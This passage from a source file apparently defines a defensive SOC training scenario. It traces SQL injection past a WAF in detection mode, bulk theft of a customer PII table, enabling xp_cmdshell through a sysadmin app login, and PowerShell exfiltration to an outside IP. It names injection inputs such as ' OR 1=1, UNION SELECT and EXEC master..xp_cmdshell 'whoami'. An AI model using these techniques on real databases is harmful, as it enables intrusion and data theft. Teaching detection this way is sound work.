Because app_shop was misconfigured as sysadmin, the operator did not stop at reading. sp_configure turned on xp_cmdshell and EXEC master..xp_cmdshell 'whoami' ran cmd.exe on the database host as the SQL Server service account — OS command execution reached straight from a web injection. Minutes later xp_cmdshell launched PowerShell to POST a staged export, C:\\Windows\\Temp\\c.csv, to the external host 45.83.192.11. The benign comparison in the data is the 03:00 Power BI job: svc_powerbi returning 184,920 rows from a reporting view — the same "big database read" shape as the exfil, but a scheduled service account, parameterized, against a view, not the live PII table.`,
    learning_objectives: [
      "Distinguish a WAF that blocked an injection (action_result=blocked, 403) from one that only detected it (action_result=alerted, origin 200) and understand that a detection-mode rule still lets the attack through",
      "Follow SQL injection from the WAF layer into the database and read Guardium / SQL Server audit records — query.text, rows_returned, sql.error, response_rows — as the ground truth of what executed",
      "Prove data exfiltration from a bulk SELECT of a PII table with a high row count, rather than inferring impact from a WAF alert alone",
      "Recognise that injection executes inside the application's DB session (app_shop from the web tier), so the attacker's true origin must be correlated in from WAF and app logs",
      "Identify xp_cmdshell abuse enabled by an over-privileged sysadmin app login as the pivot from data theft to OS command execution and web-based exfiltration",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: "2026-07-14T03:00:12Z", phase: "Baseline", action: `Scheduled Power BI read: ${biAccount} returns 184,920 rows from a reporting view — parameterized, authorized, the benign high-volume control` },
      { ts: T(0), phase: "Initial Access", action: `WAF BLOCKS ' OR 1=1 probe from ${attackerIp} — 403 under the production policy (T1190)` },
      { ts: T(3 * MIN), phase: "Initial Access", action: "UNION SELECT alerted-only under a detection-mode staging policy — origin answers 200, query executes (T1190)" },
      { ts: T(5 * MIN), phase: "Initial Access", action: "Error-based CONVERT() extraction also passes through the detection-mode policy (T1190)" },
      { ts: T(5 * MIN + 4 * SEC), phase: "Initial Access", action: `Guardium: CONVERT() fails (SQL error 245) on ${dbLogin} from ${app.webTier}, leaking a table name (T1190)` },
      { ts: T(6 * MIN), phase: "Initial Access", action: "UNION dumps 612 rows from INFORMATION_SCHEMA.COLUMNS — full schema map (T1190)" },
      { ts: T(8 * MIN), phase: "Collection", action: "Bulk SELECT of dbo.Customers returns 248,915 PII rows (email, password hashes, card-last-four) (T1213)" },
      { ts: T(8 * MIN + 1 * SEC), phase: "Collection", action: "SQL Server native audit corroborates the same SELECT — response_rows 248,915 (T1213)" },
      { ts: T(11 * MIN), phase: "Execution", action: `sp_configure enables xp_cmdshell (app login is sysadmin); xp_cmdshell 'whoami' runs cmd.exe on ${dbInstance} (T1059)` },
      { ts: T(13 * MIN), phase: "Exfiltration", action: `xp_cmdshell POSTs the staged customer dump (c.csv) to ${exfilIp} via PowerShell (T1567)` },
    ],
    questions,
  };
}
